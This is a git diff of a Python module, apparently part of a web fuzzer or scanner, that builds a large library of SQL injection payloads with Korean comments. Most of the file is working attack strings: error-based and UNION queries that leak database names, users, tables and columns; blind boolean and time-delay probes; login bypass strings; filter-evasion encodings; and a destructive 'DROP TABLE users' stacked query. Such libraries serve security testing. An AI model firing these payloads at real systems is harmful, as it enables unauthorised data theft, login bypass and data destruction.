@@ -1,18 +1,24 @@
+"""
+baseline/sqli.py - 범용 SQLi 베이스라인 페이로드
+
+CMS 무관. 문자열/숫자/ORDER BY/필드명/로그인 컨텍스트별로 구성.
+타입명은 payload_filter.py ALLOWED_TYPES 기준.
+"""
+
 from typing import Dict, List, Optional
 
 Payload = Dict[str, str]
 
-_SLEEP_SECS = 5
+_SLEEP = 5
 
-# 공격 강도별 payload 개수 제한
 STRENGTH_LIMIT = {
-    "LOW": 3,
-    "MEDIUM": 6,
-    "HIGH": 12,
-    "INSANE": 100,
+    "LOW":    5,
+    "MEDIUM": 15,
+    "HIGH":   40,
+    "INSANE": 9999,
 }
 
-# MySQL 오류 탐지 패턴
+# ── MySQL 에러 탐지 패턴 ───────────────────────────────────────────────────────
 ERROR_PATTERNS = [
     "you have an error in your sql syntax",
     "warning: mysql",
@@ -27,68 +33,193 @@ ERROR_PATTERNS = [
     "unknown column",
     "com.mysql.jdbc.exceptions",
     "org.gjt.mm.mysql",
+    "mysql_fetch",
+    "mysql_num_rows",
+    "mysql_query",
+    "pg_query",
+    "sqlite_",
+    "odbc_",
+    "microsoft ole db provider for sql server",
+    "unclosed quotation mark",
+    "quoted string not properly terminated",
+    "ora-",
+    "invalid column name",
+    "invalid object name",
 ]
 
-# 문자열 컨텍스트용 Error-based SQLi
-ERROR_BASED: List[Payload] = [
-    {"type": "SQLI_ERROR", "family": "extractvalue_database", "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -"},
-    {"type": "SQLI_ERROR", "family": "extractvalue_version", "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- -"},
-    {"type": "SQLI_ERROR", "family": "extractvalue_user", "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,user()))-- -"},
-    {"type": "SQLI_ERROR", "family": "updatexml_database", "payload": "' AND UPDATEXML(1,CONCAT(0x7e,database()),1)-- -"},
-    {"type": "SQLI_ERROR", "family": "updatexml_version", "payload": "' AND UPDATEXML(1,CONCAT(0x7e,version()),1)-- -"},
-    {"type": "SQLI_ERROR", "family": "floor_rand_group", "payload": "' AND (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)-- -"},
+# ── Error-based (문자열 컨텍스트) ─────────────────────────────────────────────
+ERROR_BASED_STRING: List[Payload] = [
+    {"type": "ERROR_BASED", "family": "extractvalue_db",      "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -"},
+    {"type": "ERROR_BASED", "family": "extractvalue_version",  "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- -"},
+    {"type": "ERROR_BASED", "family": "extractvalue_user",     "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,user()))-- -"},
+    {"type": "ERROR_BASED", "family": "updatexml_db",          "payload": "' AND UPDATEXML(1,CONCAT(0x7e,database()),1)-- -"},
+    {"type": "ERROR_BASED", "family": "updatexml_version",     "payload": "' AND UPDATEXML(1,CONCAT(0x7e,version()),1)-- -"},
+    {"type": "ERROR_BASED", "family": "updatexml_user",        "payload": "' AND UPDATEXML(1,CONCAT(0x7e,user()),1)-- -"},
+    {"type": "ERROR_BASED", "family": "floor_rand_db",         "payload": "' AND (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)-- -"},
+    {"type": "ERROR_BASED", "family": "extractvalue_tables",   "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())))-- -"},
+    {"type": "ERROR_BASED", "family": "extractvalue_columns",  "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() LIMIT 1)))-- -"},
+    {"type": "ERROR_BASED", "family": "or_extractvalue_db",    "payload": "' OR EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -"},
+    {"type": "ERROR_BASED", "family": "or_updatexml_db",       "payload": "' OR UPDATEXML(1,CONCAT(0x7e,database()),1)-- -"},
 ]
 
-# 문자열 컨텍스트용 Boolean SQLi
-BOOLEAN_BASED: List[Payload] = [
-    {"type": "SQLI_BOOL", "family": "or_tautology", "payload": "' OR '1'='1"},
-    {"type": "SQLI_BOOL", "family": "and_true", "payload": "' AND '1'='1'-- -"},
-    {"type": "SQLI_BOOL", "family": "and_false", "payload": "' AND '1'='2'-- -"},
-    {"type": "SQLI_BOOL", "family": "or_numeric_true", "payload": "' OR 1=1-- -"},
-    {"type": "SQLI_BOOL", "family": "ascii_compare", "payload": "' AND ASCII(SUBSTRING(database(),1,1))>64-- -"},
-    {"type": "SQLI_BOOL", "family": "length_check", "payload": "' AND LENGTH(database())>1-- -"},
+# ── Error-based (숫자 컨텍스트) ───────────────────────────────────────────────
+ERROR_BASED_NUMERIC: List[Payload] = [
+    {"type": "ERROR_BASED", "family": "num_extractvalue_db",     "payload": "0 OR EXTRACTVALUE(1,CONCAT(0x7e,database()))"},
+    {"type": "ERROR_BASED", "family": "num_extractvalue_version","payload": "0 OR EXTRACTVALUE(1,CONCAT(0x7e,version()))"},
+    {"type": "ERROR_BASED", "family": "num_extractvalue_user",   "payload": "0 OR EXTRACTVALUE(1,CONCAT(0x7e,user()))"},
+    {"type": "ERROR_BASED", "family": "num_updatexml_db",        "payload": "0 OR UPDATEXML(1,CONCAT(0x7e,database()),1)"},
+    {"type": "ERROR_BASED", "family": "num_floor_rand",          "payload": "0 AND (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)"},
+    {"type": "ERROR_BASED", "family": "num_extractvalue_tables", "payload": "0 OR EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())))"},
 ]
 
-# sfl 같은 필드 선택자 컨텍스트
-FIELD_SELECTOR = [
-    {"type": "SQLI_FIELD_BOOL", "family": "fs_true", "payload": "wr_subject AND 1=1-- -"},
-    {"type": "SQLI_FIELD_BOOL", "family": "fs_false", "payload": "wr_subject AND 1=2-- -"},
-    {"type": "SQLI_FIELD_TIME", "family": "fs_sleep", "payload": "wr_subject AND SLEEP(5)-- -"},
-    {"type": "SQLI_FIELD_ERROR", "family": "fs_extractvalue", "payload": "wr_subject AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -"},
+# ── Boolean-based (문자열 컨텍스트) ───────────────────────────────────────────
+BOOLEAN_STRING: List[Payload] = [
+    {"type": "BOOLEAN", "family": "or_true",           "payload": "' OR '1'='1"},
+    {"type": "BOOLEAN", "family": "or_true_comment",   "payload": "' OR 1=1-- -"},
+    {"type": "BOOLEAN", "family": "and_false",         "payload": "' AND '1'='2'-- -"},
+    {"type": "BOOLEAN", "family": "and_true",          "payload": "' AND '1'='1'-- -"},
+    {"type": "BOOLEAN", "family": "ascii_gt",          "payload": "' AND ASCII(SUBSTRING(database(),1,1))>64-- -"},
+    {"type": "BOOLEAN", "family": "ascii_eq",          "payload": "' AND ASCII(SUBSTRING(database(),1,1))=97-- -"},
+    {"type": "BOOLEAN", "family": "length_db",         "payload": "' AND LENGTH(database())>1-- -"},
+    {"type": "BOOLEAN", "family": "length_db_eq",      "payload": "' AND LENGTH(database())=6-- -"},
+    {"type": "BOOLEAN", "family": "substr_a",          "payload": "' AND SUBSTRING(database(),1,1)='a'-- -"},
+    {"type": "BOOLEAN", "family": "exists_tables",     "payload": "' AND EXISTS(SELECT * FROM information_schema.tables)-- -"},
+    {"type": "BOOLEAN", "family": "case_true",         "payload": "' AND CASE WHEN (1=1) THEN 1 ELSE 0 END-- -"},
+    {"type": "BOOLEAN", "family": "case_db_len",       "payload": "' AND CASE WHEN (LENGTH(database())>0) THEN 1 ELSE 0 END-- -"},
+    {"type": "BOOLEAN", "family": "mid_regexp",        "payload": "' AND MID(database(),1,1) REGEXP '^[a-z]'-- -"},
+    {"type": "BOOLEAN", "family": "like_wildcard",     "payload": "' AND database() LIKE '%'-- -"},
+    {"type": "BOOLEAN", "family": "in_subquery",       "payload": "' AND 1 IN (SELECT 1 FROM information_schema.tables LIMIT 1)-- -"},
 ]
 
-# ORDER BY 정렬 차이 기반 SQLi
-ORDERBY_INJECT = [
-    {"type": "SQLI_ORDERBY_BASE", "family": "ob_base_datetime", "payload": "wr_datetime"},
-    {"type": "SQLI_ORDERBY_BASE", "family": "ob_base_hit", "payload": "wr_hit"},
-    {"type": "SQLI_ORDERBY_BOOL", "family": "ob_case_true", "payload": "CASE WHEN 1=1 THEN wr_datetime ELSE wr_hit END"},
-    {"type": "SQLI_ORDERBY_BOOL", "family": "ob_case_false", "payload": "CASE WHEN 1=2 THEN wr_datetime ELSE wr_hit END"},
-    {"type": "SQLI_ORDERBY_BOOL", "family": "ob_if_true", "payload": "IF(1=1,wr_datetime,wr_hit)"},
-    {"type": "SQLI_ORDERBY_BOOL", "family": "ob_if_false", "payload": "IF(1=2,wr_datetime,wr_hit)"},
+# ── Boolean-based (숫자 컨텍스트) ─────────────────────────────────────────────
+BOOLEAN_NUMERIC: List[Payload] = [
+    {"type": "BOOLEAN", "family": "num_or_true",       "payload": "0 OR 1=1"},
+    {"type": "BOOLEAN", "family": "num_and_false",     "payload": "1 AND 1=2"},
+    {"type": "BOOLEAN", "family": "num_ascii",         "payload": "0 OR ASCII(SUBSTRING(database(),1,1))>64"},
+    {"type": "BOOLEAN", "family": "num_length",        "payload": "0 OR LENGTH(database())>1"},
+    {"type": "BOOLEAN", "family": "num_case",          "payload": "0 OR CASE WHEN (1=1) THEN 1 ELSE 0 END"},
+    {"type": "BOOLEAN", "family": "num_exists",        "payload": "0 OR EXISTS(SELECT * FROM information_schema.tables)"},
 ]
 
-# 로그인 인증 우회 SQLi
-AUTH_BYPASS: List[Payload] = [
-    {"type": "SQLI_AUTH", "family": "auth_or_string_true", "payload": "' OR '1'='1'-- -"},
-    {"type": "SQLI_AUTH", "family": "auth_or_numeric_true", "payload": "' OR 1=1-- -"},
-    {"type": "SQLI_AUTH", "family": "auth_or_like_true", "payload": "' OR 'a'='a'-- -"},
-    {"type": "SQLI_AUTH", "family": "auth_double_quote", "payload": "\" OR \"1\"=\"1\"-- -"},
-    {"type": "SQLI_AUTH", "family": "auth_comment_only", "payload": "'-- -"},
-    {"type": "SQLI_AUTH", "family": "auth_error_extract", "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -"},
+# ── Time-based (문자열 컨텍스트) ──────────────────────────────────────────────
+TIME_BASED_STRING: List[Payload] = [
+    {"type": "TIME_BASED", "family": "and_sleep",          "payload": f"' AND SLEEP({_SLEEP})-- -"},
+    {"type": "TIME_BASED", "family": "or_sleep",           "payload": f"' OR SLEEP({_SLEEP})-- -"},
+    {"type": "TIME_BASED", "family": "if_sleep_true",      "payload": f"' AND IF(1=1,SLEEP({_SLEEP}),0)-- -"},
+    {"type": "TIME_BASED", "family": "if_sleep_false",     "payload": f"' AND IF(1=2,SLEEP({_SLEEP}),0)-- -"},
+    {"type": "TIME_BASED", "family": "case_sleep",         "payload": f"' AND CASE WHEN (1=1) THEN SLEEP({_SLEEP}) ELSE 0 END-- -"},
+    {"type": "TIME_BASED", "family": "subquery_sleep",     "payload": f"' AND 0 IN (SELECT SLEEP({_SLEEP}))-- -"},
+    {"type": "TIME_BASED", "family": "benchmark",          "payload": f"' OR BENCHMARK({_SLEEP*1000000},MD5(1))-- -"},
+    {"type": "TIME_BASED", "family": "if_ascii_sleep",     "payload": f"' AND IF(ASCII(SUBSTRING(database(),1,1))>0,SLEEP({_SLEEP}),0)-- -"},
+    {"type": "TIME_BASED", "family": "pg_sleep",           "payload": f"'; SELECT pg_sleep({_SLEEP})-- -"},
+    {"type": "TIME_BASED", "family": "waitfor",            "payload": f"'; WAITFOR DELAY '0:0:{_SLEEP}'-- -"},
 ]
 
-# Time-based SQLi 템플릿
-_TIME_TEMPLATES = [
-    ("time_string_and_sleep_sq", "{orig}' AND SLEEP({sleep})-- -"),
-    ("time_string_and_sleep_dq", '{orig}" AND SLEEP({sleep})-- -'),
-    ("time_string_or_sleep_sq", "{orig}' OR SLEEP({sleep})-- -"),
-    ("time_if_sleep_sq", "{orig}' AND IF(1=1,SLEEP({sleep}),0)-- -"),
-    ("time_subquery_sleep_sq", "{orig}' AND 0 IN (SELECT SLEEP({sleep}))-- -"),
-    ("time_numeric_sleep", "0 OR SLEEP({sleep})"),
-    ("time_numeric_if", "0 OR IF(1=1,SLEEP({sleep}),0)"),
-    ("time_benchmark", "{orig}' OR BENCHMARK({benchmark_count},MD5(1))-- -"),
+# ── Time-based (숫자 컨텍스트) ────────────────────────────────────────────────
+TIME_BASED_NUMERIC: List[Payload] = [
+    {"type": "TIME_BASED", "family": "num_sleep",          "payload": f"0 OR SLEEP({_SLEEP})"},
+    {"type": "TIME_BASED", "family": "num_if_sleep",       "payload": f"0 OR IF(1=1,SLEEP({_SLEEP}),0)"},
+    {"type": "TIME_BASED", "family": "num_case_sleep",     "payload": f"0 OR CASE WHEN (1=1) THEN SLEEP({_SLEEP}) ELSE 0 END"},
+    {"type": "TIME_BASED", "family": "num_benchmark",      "payload": f"0 OR BENCHMARK({_SLEEP*1000000},MD5(1))"},
 ]
 
+# ── UNION-based ───────────────────────────────────────────────────────────────
+def _union_nulls(n: int, quote: str = "'") -> Payload:
+    nulls = ",".join(["NULL"] * n)
+    return {"type": "UNION", "family": f"null_probe_{n}col", "payload": f"{quote} UNION SELECT {nulls}-- -"}
+
+UNION_BASED: List[Payload] = (
+    [_union_nulls(i) for i in range(1, 11)]
+    + [
+        {"type": "UNION", "family": "version_3col",   "payload": "' UNION SELECT version(),NULL,NULL-- -"},
+        {"type": "UNION", "family": "database_3col",  "payload": "' UNION SELECT database(),NULL,NULL-- -"},
+        {"type": "UNION", "family": "user_3col",      "payload": "' UNION SELECT user(),NULL,NULL-- -"},
+        {"type": "UNION", "family": "tables_3col",    "payload": "' UNION SELECT GROUP_CONCAT(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema=database()-- -"},
+        {"type": "UNION", "family": "columns_3col",   "payload": "' UNION SELECT GROUP_CONCAT(column_name),NULL,NULL FROM information_schema.columns WHERE table_schema=database() LIMIT 1-- -"},
+        {"type": "UNION", "family": "num_null_3col",  "payload": "0 UNION SELECT NULL,NULL,NULL-- -"},
+        {"type": "UNION", "family": "num_version",    "payload": "0 UNION SELECT version(),NULL,NULL-- -"},
+        {"type": "UNION", "family": "num_database",   "payload": "0 UNION SELECT database(),NULL,NULL-- -"},
+    ]
+)
+
+# ── ORDER BY Injection ────────────────────────────────────────────────────────
+ORDERBY: List[Payload] = [
+    {"type": "SQLI_ORDERBY", "family": "sleep_subq",        "payload": f"(SELECT SLEEP({_SLEEP}))"},
+    {"type": "SQLI_ORDERBY", "family": "if_sleep",          "payload": f"IF(1=1,SLEEP({_SLEEP}),0)"},
+    {"type": "SQLI_ORDERBY", "family": "case_true",         "payload": "CASE WHEN (1=1) THEN 1 ELSE 0 END"},
+    {"type": "SQLI_ORDERBY", "family": "case_false",        "payload": "CASE WHEN (1=2) THEN 1 ELSE 0 END"},
+    {"type": "SQLI_ORDERBY", "family": "ascii_case",        "payload": "CASE WHEN (ASCII(SUBSTRING(database(),1,1))>64) THEN 1 ELSE 0 END"},
+    {"type": "SQLI_ORDERBY", "family": "extractvalue_db",   "payload": "EXTRACTVALUE(1,CONCAT(0x7e,database()))"},
+    {"type": "SQLI_ORDERBY", "family": "extractvalue_ver",  "payload": "EXTRACTVALUE(1,CONCAT(0x7e,version()))"},
+    {"type": "SQLI_ORDERBY", "family": "updatexml_db",      "payload": "UPDATEXML(1,CONCAT(0x7e,database()),1)"},
+    {"type": "SQLI_ORDERBY", "family": "updatexml_user",    "payload": "UPDATEXML(1,CONCAT(0x7e,user()),1)"},
+    {"type": "SQLI_ORDERBY", "family": "asc_sleep",         "payload": f"1,(SELECT SLEEP({_SLEEP}))"},
+    {"type": "SQLI_ORDERBY", "family": "if_ascii_sleep",    "payload": f"IF(ASCII(SUBSTRING(database(),1,1))>64,SLEEP({_SLEEP}),0)"},
+    {"type": "SQLI_ORDERBY", "family": "rand_bool",         "payload": "RAND(0)"},
+    {"type": "SQLI_ORDERBY", "family": "floor_rand",        "payload": "(SELECT COUNT(*) FROM information_schema.tables GROUP BY FLOOR(RAND(0)*2))"},
+]
+
+# ── Field Name Injection (WHERE col LIKE '%x%') ───────────────────────────────
+FIELD_SELECTOR: List[Payload] = [
+    {"type": "SQLI_FIELD", "family": "bool_true",        "payload": "1=1)-- -"},
+    {"type": "SQLI_FIELD", "family": "bool_false",       "payload": "1=2)-- -"},
+    {"type": "SQLI_FIELD", "family": "sleep",            "payload": f"SLEEP({_SLEEP})-- -"},
+    {"type": "SQLI_FIELD", "family": "if_sleep",         "payload": f"IF(1=1,SLEEP({_SLEEP}),0))-- -"},
+    {"type": "SQLI_FIELD", "family": "extractvalue_db",  "payload": "EXTRACTVALUE(1,CONCAT(0x7e,database())))-- -"},
+    {"type": "SQLI_FIELD", "family": "extractvalue_ver", "payload": "EXTRACTVALUE(1,CONCAT(0x7e,version())))-- -"},
+    {"type": "SQLI_FIELD", "family": "updatexml_db",     "payload": "UPDATEXML(1,CONCAT(0x7e,database()),1))-- -"},
+    {"type": "SQLI_FIELD", "family": "and_sleep",        "payload": f"id)AND(SLEEP({_SLEEP}))-- -"},
+    {"type": "SQLI_FIELD", "family": "and_extractvalue", "payload": "id)AND(EXTRACTVALUE(1,CONCAT(0x7e,database())))-- -"},
+    {"type": "SQLI_FIELD", "family": "and_true",         "payload": "id)AND(1=1)-- -"},
+    {"type": "SQLI_FIELD", "family": "and_false",        "payload": "id)AND(1=2)-- -"},
+    {"type": "SQLI_FIELD", "family": "or_extractvalue",  "payload": "id)OR(EXTRACTVALUE(1,CONCAT(0x7e,database())))-- -"},
+]
+
+# ── Login Form SQLi ───────────────────────────────────────────────────────────
+SQLI_LOGIN: List[Payload] = [
+    {"type": "SQLI_LOGIN", "family": "auth_bypass_admin",   "payload": "admin'-- -"},
+    {"type": "SQLI_LOGIN", "family": "auth_bypass_comment", "payload": "'-- -"},
+    {"type": "SQLI_LOGIN", "family": "or_true_dq",          "payload": "' OR '1'='1'-- -"},
+    {"type": "SQLI_LOGIN", "family": "or_true_numeric",     "payload": "' OR 1=1-- -"},
+    {"type": "SQLI_LOGIN", "family": "or_like",             "payload": "' OR 'a'='a'-- -"},
+    {"type": "SQLI_LOGIN", "family": "or_tautology",        "payload": "' OR '1'='1"},
+    {"type": "SQLI_LOGIN", "family": "double_quote_bypass", "payload": "\" OR \"1\"=\"1\"-- -"},
+    {"type": "SQLI_LOGIN", "family": "or_numeric",          "payload": "0 OR 1=1-- -"},
+    {"type": "SQLI_LOGIN", "family": "sleep_detect",        "payload": f"' AND SLEEP({_SLEEP})-- -"},
+    {"type": "SQLI_LOGIN", "family": "or_sleep",            "payload": f"0 OR SLEEP({_SLEEP})-- -"},
+    {"type": "SQLI_LOGIN", "family": "if_sleep",            "payload": f"' AND IF(1=1,SLEEP({_SLEEP}),0)-- -"},
+    {"type": "SQLI_LOGIN", "family": "extractvalue_db",     "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -"},
+    {"type": "SQLI_LOGIN", "family": "updatexml_user",      "payload": "' OR UPDATEXML(1,CONCAT(0x7e,user()),1)-- -"},
+    {"type": "SQLI_LOGIN", "family": "union_3col",          "payload": "' UNION SELECT NULL,NULL,NULL-- -"},
+    {"type": "SQLI_LOGIN", "family": "hash_bypass",         "payload": "' OR 1=1 LIMIT 1-- -"},
+    {"type": "SQLI_LOGIN", "family": "comment_hash",        "payload": "admin'#"},
+    {"type": "SQLI_LOGIN", "family": "wildcard_like",       "payload": "' OR username LIKE '%admin%'-- -"},
+    {"type": "SQLI_LOGIN", "family": "null_pass",           "payload": "' OR password IS NULL-- -"},
+    {"type": "SQLI_LOGIN", "family": "stacked_query",       "payload": "'; DROP TABLE users-- -"},
+]
+
+# ── 특수 컨텍스트 ─────────────────────────────────────────────────────────────
+
+# JSON 파라미터 내 SQLi
+JSON_CONTEXT: List[Payload] = [
+    {"type": "SQLI_STRING", "family": "json_or_true",       "payload": "\" OR \"1\"=\"1"},
+    {"type": "SQLI_STRING", "family": "json_and_sleep",     "payload": f"\" AND SLEEP({_SLEEP})-- -"},
+    {"type": "SQLI_STRING", "family": "json_extractvalue",  "payload": "\" AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -"},
+]
+
+# 이중 인코딩 / 필터 우회
+ENCODED: List[Payload] = [
+    {"type": "SQLI_STRING", "family": "url_encoded_quote",  "payload": "%27 OR 1=1-- -"},
+    {"type": "SQLI_STRING", "family": "double_encoded",     "payload": "%2527 OR 1=1-- -"},
+    {"type": "SQLI_STRING", "family": "unicode_quote",      "payload": "' OR 1=1-- -"},
+    {"type": "SQLI_STRING", "family": "hex_encoded_db",     "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,0x64617461626173652829))-- -"},
+    {"type": "SQLI_STRING", "family": "comment_bypass",     "payload": "' /*!OR*/ 1=1-- -"},
+    {"type": "SQLI_STRING", "family": "inline_comment",     "payload": "'/**/OR/**/1=1-- -"},
+    {"type": "SQLI_STRING", "family": "case_variation",     "payload": "' oR '1'='1'-- -"},
+    {"type": "SQLI_STRING", "family": "scientific_notation", "payload": "' OR 1e0=1-- -"},
+]
+
+# ── 헬퍼 함수 ─────────────────────────────────────────────────────────────────
 
 def match_error(response_body: str) -> Optional[str]:
     body_lower = response_body.lower()
@@ -102,84 +233,55 @@ def _limit(payloads: List[Payload], strength: str) -> List[Payload]:
     return payloads[: STRENGTH_LIMIT.get(strength.upper(), STRENGTH_LIMIT["MEDIUM"])]
 
 
-def _build_union_null_probes(max_cols: int = 6) -> List[Payload]:
-    probes = []
-    for n in range(1, max_cols + 1):
-        nulls = ",".join(["NULL"] * n)
-        probes.append({
-            "type": "SQLI_UNION",
-            "family": f"null_probe_{n}",
-            "payload": f"' UNION SELECT {nulls}-- -",
-        })
-    return probes
+def _dedupe(groups: List[List[Payload]]) -> List[Payload]:
+    seen = set()
+    result: List[Payload] = []
+    for group in groups:
+        for item in group:
+            if item["payload"] not in seen:
+                seen.add(item["payload"])
+                result.append(item)
+    return result
 
 
-# UNION 컬럼 수 탐지 및 정보 추출
-UNION_BASED: List[Payload] = _build_union_null_probes() + [
-    {"type": "SQLI_UNION", "family": "version_extract", "payload": "' UNION SELECT version(),NULL,NULL-- -"},
-    {"type": "SQLI_UNION", "family": "database_extract", "payload": "' UNION SELECT database(),NULL,NULL-- -"},
-    {"type": "SQLI_UNION", "family": "user_extract", "payload": "' UNION SELECT user(),NULL,NULL-- -"},
-]
+# ── 컨텍스트별 조회 ───────────────────────────────────────────────────────────
 
-
-def build_boolean(orig: str = "1") -> List[Payload]:
-    return [
-        {"type": "SQLI_BOOL", "family": "dq_true_cond", "payload": f'{orig}" AND "1"="1" -- '},
-        {"type": "SQLI_BOOL", "family": "dq_false_cond", "payload": f'{orig}" AND "1"="2" -- '},
-        {"type": "SQLI_BOOL", "family": "sq_true_cond", "payload": f"{orig}' AND '1'='1' -- "},
-        {"type": "SQLI_BOOL", "family": "sq_false_cond", "payload": f"{orig}' AND '1'='2' -- "},
-    ]
-
-
-def build_auth(orig: str = "user") -> List[Payload]:
-    return [
-        {"type": "SQLI_AUTH", "family": "auth_orig_comment", "payload": f"{orig}'-- -"},
-        {"type": "SQLI_AUTH", "family": "auth_orig_or_true", "payload": f"{orig}' OR '1'='1'-- -"},
-        *AUTH_BYPASS,
-    ]
-
-
-def build_time_based(orig: str = "1", sleep: int = _SLEEP_SECS) -> List[Payload]:
-    results: List[Payload] = []
-    for family, template in _TIME_TEMPLATES:
-        values = {
-            "orig": orig,
-            "sleep": sleep,
-            "benchmark_count": sleep * 1_000_000,
-        }
-        results.append({
-            "type": "SQLI_TIME",
-            "family": family,
-            "payload": template.format(**values),
-        })
-    return results
-
-
-# SQL 컨텍스트별 payload 선택
-def get_by_sql_context(
-    context: str,
-    strength: str = "MEDIUM",
-    orig: str = "1",
-) -> List[Payload]:
-    normalized = context.lower()
-
-    if normalized == "orderby":
-        payloads = ORDERBY_INJECT
-    elif normalized == "field_selector":
-        payloads = FIELD_SELECTOR
-    elif normalized == "auth":
-        payloads = build_auth(orig if orig != "1" else "user") + ERROR_BASED + build_time_based(orig)
-    elif normalized in {"like_string", "cve_prefix"}:
-        payloads = ERROR_BASED + BOOLEAN_BASED + build_boolean(orig) + UNION_BASED + build_time_based(orig)
+def get_by_context(context: str, strength: str = "MEDIUM") -> List[Payload]:
+    context = context.lower()
+    if context == "string":
+        pool = _dedupe([ERROR_BASED_STRING, BOOLEAN_STRING, TIME_BASED_STRING])
+    elif context == "numeric":
+        pool = _dedupe([ERROR_BASED_NUMERIC, BOOLEAN_NUMERIC, TIME_BASED_NUMERIC])
+    elif context == "orderby":
+        pool = ORDERBY
+    elif context == "field":
+        pool = FIELD_SELECTOR
+    elif context in {"login", "auth"}:
+        pool = SQLI_LOGIN
+    elif context == "union":
+        pool = UNION_BASED
+    elif context == "encoded":
+        pool = ENCODED
     else:
-        payloads = get_by_strength("INSANE", orig)
+        pool = get_all()
+    return _limit(pool, strength)
 
-    return _limit(payloads, strength)
 
-
-def get_by_strength(strength: str = "MEDIUM", orig: str = "1") -> List[Payload]:
-    payloads = ERROR_BASED + BOOLEAN_BASED + build_boolean(orig) + UNION_BASED + build_time_based(orig)
-    return _limit(payloads, strength)
+def get_all() -> List[Payload]:
+    return _dedupe([
+        ERROR_BASED_STRING,
+        ERROR_BASED_NUMERIC,
+        BOOLEAN_STRING,
+        BOOLEAN_NUMERIC,
+        TIME_BASED_STRING,
+        TIME_BASED_NUMERIC,
+        UNION_BASED,
+        ORDERBY,
+        FIELD_SELECTOR,
+        SQLI_LOGIN,
+        JSON_CONTEXT,
+        ENCODED,
+    ])
 
 
 # 컨텍스트별 Blind SQLi — 키: SQL 컨텍스트 타입
@@ -236,14 +338,20 @@ def get_blind_sqli(context: str) -> List[Payload]:
     return BLIND_SQLI.get(context.lower(), [])
 
 
-def get_all(orig: str = "1") -> List[Payload]:
-    return (
-        ERROR_BASED
-        + BOOLEAN_BASED
-        + build_boolean(orig)
-        + UNION_BASED
-        + build_time_based(orig)
-        + FIELD_SELECTOR
-        + ORDERBY_INJECT
-        + build_auth(orig if orig != "1" else "user")
-    )
+def get_by_strength(strength: str = "MEDIUM") -> List[Payload]:
+    return _limit(get_all(), strength)
+
+
+# ── 하위 호환 alias ───────────────────────────────────────────────────────────
+_SQL_CONTEXT_MAP = {
+    "field_selector": "field",
+    "auth":           "login",
+    "like_string":    None,   # BLIND_SQLI 사용
+}
+
+def get_by_sql_context(context: str, strength: str = "MEDIUM") -> List[Payload]:
+    """fuzzer/strategy.py 호환용 alias. get_by_context / get_blind_sqli 래핑."""
+    mapped = _SQL_CONTEXT_MAP.get(context.lower())
+    if mapped is None and context.lower() == "like_string":
+        return _limit(get_blind_sqli("like_string"), strength)
+    return get_by_context(mapped or context, strength)
